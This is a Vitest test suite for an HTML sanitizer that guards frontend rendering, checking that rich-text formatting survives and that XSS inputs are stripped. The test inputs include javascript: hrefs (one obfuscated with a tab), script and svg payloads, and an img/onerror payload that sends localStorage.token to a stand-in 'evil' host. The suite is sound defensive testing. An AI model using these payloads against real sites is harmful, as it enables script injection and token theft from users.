import { describe, expect, it } from 'vitest';
import { sanitizeHtml } from './sanitize-html';

describe('sanitizeHtml (frontend render guard)', () => {
  it('returns empty string for empty/nullish input', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
  });

  it('preserves the formatting RichEditor produces', () => {
    const rich =
      '<h3>Title</h3><b>bold</b> <i>italic</i>' +
      '<ul><li>one</li><li>two</li></ul>' +
      '<ol><li>step</li></ol>' +
      '<code>x = 1</code>';
    expect(sanitizeHtml(rich)).toBe(rich);
  });

  it('keeps safe anchors with their href', () => {
    expect(sanitizeHtml('<a href="https://example.com">link</a>')).toBe(
      '<a href="https://example.com">link</a>',
    );
    expect(sanitizeHtml('<a href="/projects/1">rel</a>')).toBe(
      '<a href="/projects/1">rel</a>',
    );
  });

  it('strips the javascript: scheme from anchors', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">x</a>');
    expect(out).not.toContain('javascript');
    expect(out).toBe('<a>x</a>');
  });

  it('removes obfuscated javascript: schemes (control chars / whitespace)', () => {
    const out = sanitizeHtml('<a href="java\tscript:alert(1)">x</a>');
    expect(out.toLowerCase()).not.toContain('script:');
    expect(out).toBe('<a>x</a>');
  });

  it('drops <script> including its body', () => {
    expect(sanitizeHtml('before<script>alert(1)</script>after')).toBe(
      'beforeafter',
    );
  });

  it('strips event-handler attributes on allowed tags', () => {
    const out = sanitizeHtml('<b onclick="steal()">hi</b>');
    expect(out).toBe('<b>hi</b>');
  });

  it('neutralizes the img/onerror token-theft payload', () => {
    const payload =
      '<img src=x onerror="fetch(\'//evil/?t=\'+localStorage.token)">';
    const out = sanitizeHtml(payload);
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('<img');
    expect(out).toBe('');
  });

  it('unwraps unknown elements but keeps their text content', () => {
    expect(sanitizeHtml('<marquee>hello</marquee>')).toBe('hello');
    expect(sanitizeHtml('<div><b>keep</b></div>')).toBe(
      '<div><b>keep</b></div>',
    );
  });

  it('drops svg (mutation-XSS vector) entirely', () => {
    const out = sanitizeHtml('<svg><script>alert(1)</script></svg>text');
    expect(out).toBe('text');
  });

  it('removes html comments', () => {
    expect(sanitizeHtml('a<!-- <script>x</script> -->b')).toBe('ab');
  });
});
